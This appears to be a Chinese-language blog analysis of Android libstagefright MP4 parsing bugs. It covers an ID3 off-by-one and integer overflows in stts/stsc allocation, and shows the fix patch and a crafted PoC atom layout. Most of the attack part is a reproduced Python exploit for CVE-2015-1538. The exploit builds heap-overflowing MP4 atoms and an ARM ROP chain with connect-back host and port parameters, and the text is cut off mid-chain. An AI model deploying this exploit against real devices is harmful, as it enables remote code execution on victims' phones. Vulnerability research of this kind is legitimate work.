class="literal">true</span>; <span class="comment">// Common case</span></span><br><span class="line">        <span class="keyword">char16_t</span> *framedata = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">int</span> len16 = <span class="number">0</span>; <span class="comment">// Number of UTF-16 characters</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// smallest possible valid UTF-16 string w BOM: 0xfe 0xff 0x00 0x00</span></span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (size - <span class="number">6</span> &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">            len16 = ((size - <span class="number">6</span>) / <span class="number">2</span>) - <span class="number">1</span>; <span class="comment">// don't include 0x0000 terminator</span></span><br><span class="line">            framedata = (<span class="keyword">char16_t</span> *)(buffer + <span class="number">6</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0xfffe</span> == *framedata) &#123;</span><br><span class="line">                <span class="comment">// endianness marker (BOM) doesn't match host endianness</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len16; i++) &#123;</span><br><span class="line">                    framedata[i] = bswap_16(framedata[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// BOM is now swapped to 0xfeff, we will execute next block too</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0xfeff</span> == *framedata) &#123;</span><br><span class="line">                <span class="comment">// Remove the BOM</span></span><br><span class="line">                framedata++;</span><br><span class="line">                len16--;</span><br><span class="line">                isUTF8 = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// else normal non-zero-length UTF-8 string</span></span><br><span class="line">            <span class="comment">// we can't handle UTF-16 without BOM as there is no other</span></span><br><span class="line">            <span class="comment">// indication of encoding.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// buffer don't include 0x0000 terminator</span></span><br><span class="line">        <span class="keyword">if</span> (isUTF8) &#123;</span><br><span class="line">            mFileMetaData-&gt;setCString(metadataKey, (<span class="keyword">const</span> <span class="keyword">char</span> *)buffer + <span class="number">6</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Convert from UTF-16 string to UTF-8 string.</span></span><br><span class="line">            String8 tmpUTF8str(framedata, len16);</span><br><span class="line">            mFileMetaData-&gt;setCString(metadataKey, tmpUTF8str.<span class="built_in">string</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chunk_data_size</code>是data的长度，然而分配了个char[]没有把结尾的’\0’算进去，最后memcpy的时候也没有，导致字符串无结尾了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MetaData::typed_data::setData(</span><br><span class="line">        <span class="keyword">uint32_t</span> type, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    clear();</span><br><span class="line"></span><br><span class="line">    mType = type;</span><br><span class="line">    allocateStorage(size);</span><br><span class="line">    <span class="built_in">memcpy</span>(storage(), data, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>storage()是个这个，copy到这上面了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">typed_data</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">uint32_t</span> mType;</span><br><span class="line">    <span class="keyword">size_t</span> mSize;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> *ext_data;</span><br><span class="line">        <span class="keyword">float</span> reservoir;</span><br><span class="line">    &#125; u;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">usesReservoir</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mSize &lt;= <span class="keyword">sizeof</span>(u.reservoir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">allocateStorage</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">freeStorage</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> *<span class="title">storage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> usesReservoir() ? &amp;u.reservoir : u.ext_data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="keyword">void</span> *<span class="title">storage</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> usesReservoir() ? &amp;u.reservoir : u.ext_data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看起来是off-by-one，off-by-one咋利用来着：</p><ul><li>修改元数据，比如ptmalloc的chunck的size的PRE_ISSUE位覆盖为0</li><li>打印可以信息泄露</li><li>可以覆盖指针的低字节</li></ul><h2 id="漏洞点（真）"><a href="#漏洞点（真）" class="headerlink" title="漏洞点（真）"></a>漏洞点（真）</h2><p>看一下patch：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-330</span>,<span class="number">7</span> +<span class="number">330</span>,<span class="number">7</span> @@</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mTimeToSampleCount = U32_AT(&amp;header[<span class="number">4</span>]);</span><br><span class="line">-    <span class="keyword">uint64_t</span> allocSize = mTimeToSampleCount * <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">+    <span class="keyword">uint64_t</span> allocSize = mTimeToSampleCount * <span class="number">2</span> * (<span class="keyword">uint64_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="keyword">if</span> (allocSize &gt; SIZE_MAX) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_OUT_OF_RANGE;</span><br><span class="line">    &#125;</span><br><span class="line">@@ <span class="number">-376</span>,<span class="number">7</span> +<span class="number">376</span>,<span class="number">7</span> @@</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mNumCompositionTimeDeltaEntries = numEntries;</span><br><span class="line">-    <span class="keyword">uint64_t</span> allocSize = numEntries * <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">+    <span class="keyword">uint64_t</span> allocSize = numEntries * <span class="number">2</span> * (<span class="keyword">uint64_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="keyword">if</span> (allocSize &gt; SIZE_MAX) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_OUT_OF_RANGE;</span><br><span class="line">    &#125;</span><br><span class="line">@@ <span class="number">-426</span>,<span class="number">7</span> +<span class="number">426</span>,<span class="number">7</span> @@</span><br><span class="line">        ALOGV(<span class="string">"Table of sync samples is empty or has only a single entry!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">-    <span class="keyword">uint64_t</span> allocSize = mNumSyncSamples * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">+    <span class="keyword">uint64_t</span> allocSize = mNumSyncSamples * (<span class="keyword">uint64_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="keyword">if</span> (allocSize &gt; SIZE_MAX) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_OUT_OF_RANGE;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>int32跟int32相乘时候，会产生溢出，都转成int64就没问题了。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造POC，我们设mTimeToSampleCount <em> 2 </em> 4 = 0xFFFFFFFF + 0x1可得，mTimeToSampleCount＝0x20000000 我们以mTimeToSampleCount＝0x20000000构造的一个POC如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk_size(4字节)   ---- 00 00 00 18</span><br><span class="line"><span class="string">"stts"</span>(chunk_type)  ---- 73 74 74 73</span><br><span class="line">unknown(4字节)      ---- 00 00 00 00</span><br><span class="line">mTimeToSampleCount  ---- 20 00 00 00</span><br></pre></td></tr></table></figure><p>下面是exp。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Joshua J. Drake (@jduck) of ZIMPERIUM zLabs</span></span><br><span class="line"><span class="comment"># Shout outs to our friends at Optiv (formerly Accuvant Labs)</span></span><br><span class="line"><span class="comment"># (C) Joshua J. Drake, ZIMPERIUM Inc, Mobile Threat Protection, 2015</span></span><br><span class="line"><span class="comment"># www.zimperium.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Exploit for RCE Vulnerability CVE-2015-1538 #1</span></span><br><span class="line"><span class="comment"># Integer Overflow in the libstagefright MP4 'stsc' atom handling</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don't forget, the output of "create_mp4" can be delivered many ways!</span></span><br><span class="line"><span class="comment"># MMS is the most dangerous attack vector, but not the only one...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># DISCLAIMER: This exploit is for testing and educational purposes only. Any</span></span><br><span class="line"><span class="comment"># other usage for this code is not allowed. Use at your own risk.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># "With great power comes great responsibility." - Uncle Ben</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Creates a single MP4 atom - LEN, TAG, DATA</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_chunk</span><span class="params">(tag, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(tag) != <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">raise</span> <span class="string">'Yo! They call it "FourCC" for a reason.'</span></span><br><span class="line">    ret = struct.pack(<span class="string">'&gt;L'</span>, len(data) + <span class="number">8</span>)</span><br><span class="line">    ret += tag</span><br><span class="line">    ret += data</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Make an 'stco' atom - Sample Table Chunk Offets</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stco</span><span class="params">(extra=<span class="string">''</span>)</span>:</span></span><br><span class="line">    ret =  struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># version</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># mNumChunkOffsets</span></span><br><span class="line">    <span class="keyword">return</span> make_chunk(<span class="string">'stco'</span>, ret+extra)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Make an 'stsz' atom - Sample Table Size</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stsz</span><span class="params">(extra=<span class="string">''</span>)</span>:</span></span><br><span class="line">    ret =  struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># version</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># mDefaultSampleSize</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># mNumSampleSizes</span></span><br><span class="line">    <span class="keyword">return</span> make_chunk(<span class="string">'stsz'</span>, ret+extra)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Make an 'stts' atom - Sample Table Time-to-Sample</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stts</span><span class="params">()</span>:</span></span><br><span class="line">    ret =  struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># version</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># mTimeToSampleCount</span></span><br><span class="line">    <span class="keyword">return</span> make_chunk(<span class="string">'stts'</span>, ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This creates a single Sample Table Sample-to-Chunk entry</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stsc_entry</span><span class="params">(start, per, desc)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, start + <span class="number">1</span>)</span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, per)</span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, desc)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Make an 'stsc' chunk - Sample Table Sample-to-Chunk</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If the caller desires, we will attempt to trigger (CVE-2015-1538 #1) and</span></span><br><span class="line"><span class="comment"># cause a heap overflow.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stsc</span><span class="params">(num_alloc, num_write, sp_addr=<span class="number">0x42424242</span>, do_overflow = False)</span>:</span></span><br><span class="line">    ret =  struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># version/flags</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># this is the clean version...</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> do_overflow:</span><br><span class="line">        ret += struct.pack(<span class="string">'&gt;L'</span>, num_alloc) <span class="comment"># mNumSampleToChunkOffsets</span></span><br><span class="line">        ret += <span class="string">'Z'</span> * (<span class="number">12</span> * num_alloc)</span><br><span class="line">        <span class="keyword">return</span> make_chunk(<span class="string">'stsc'</span>, ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now the explicit version. (trigger the bug)</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0xc0000000</span> + num_alloc) <span class="comment"># mNumSampleToChunkOffsets</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill in the entries that will overflow the buffer</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, num_write):</span><br><span class="line">        ret += make_stsc_entry(sp_addr, sp_addr, sp_addr)</span><br><span class="line"></span><br><span class="line">    ret = make_chunk(<span class="string">'stsc'</span>, ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># patch the data_size</span></span><br><span class="line">    ret = struct.pack(<span class="string">'&gt;L'</span>, <span class="number">8</span> + <span class="number">8</span> + (num_alloc * <span class="number">12</span>)) + ret[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Build the ROP chain</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ROP pivot by Georg Wicherski! Thanks!</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(gdb) x/10i __dl_restore_core_regs</span></span><br><span class="line"><span class="string">   0xb0002850 &lt;__dl_restore_core_regs&gt;: add r1, r0, #52 ; 0x34</span></span><br><span class="line"><span class="string">   0xb0002854 &lt;__dl_restore_core_regs+4&gt;:   ldm r1, &#123;r3, r4, r5&#125;</span></span><br><span class="line"><span class="string">   0xb0002858 &lt;__dl_restore_core_regs+8&gt;:   push    &#123;r3, r4, r5&#125;</span></span><br><span class="line"><span class="string">   0xb000285c &lt;__dl_restore_core_regs+12&gt;:  ldm r0, &#123;r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11&#125;</span></span><br><span class="line"><span class="string">   0xb0002860 &lt;__dl_restore_core_regs+16&gt;:  ldm sp, &#123;sp, lr, pc&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">b0001144 &lt;__dl_mprotect&gt;:</span></span><br><span class="line"><span class="string">b0001144:       e92d0090        push    &#123;r4, r7&#125;</span></span><br><span class="line"><span class="string">b0001148:       e3a0707d        mov     r7, #125        ; 0x7d</span></span><br><span class="line"><span class="string">b000114c:       ef000000        svc     0x00000000</span></span><br><span class="line"><span class="string">b0001150:       e8bd0090        pop     &#123;r4, r7&#125;</span></span><br><span class="line"><span class="string">b0001154:       e1b00000        movs    r0, r0</span></span><br><span class="line"><span class="string">b0001158:       512fff1e        bxpl    lr</span></span><br><span class="line"><span class="string">b000115c:       ea0015cc        b       b0006894 &lt;__dl_raise+0x10&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span><span class="params">(off, sp_addr, newpc_val, cb_host, cb_port)</span>:</span></span><br><span class="line">    rop = <span class="string">''</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + off + <span class="number">0x10</span>) <span class="comment"># new sp</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xb0002a98</span>)           <span class="comment"># new lr - pop &#123;pc&#125;</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xb00038b2</span>+<span class="number">1</span>)         <span class="comment"># new pc: pop &#123;r0, r1, r2, r3, r4, pc&#125;</span></span><br><span class="line"></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, sp_addr &amp; <span class="number">0xfffff000</span>) <span class="comment"># new r0 - base address (page aligned)</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0x1000</span>)               <span class="comment"># new r1 - length</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">7</span>)                    <span class="comment"># new r2 - protection</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xd000d003</span>)           <span class="comment"># new r3 - scratch</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xd000d004</span>)           <span class="comment"># new r4 - scratch</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xb0001144</span>)           <span class="comment"># new pc - _dl_mprotect</span></span><br><span 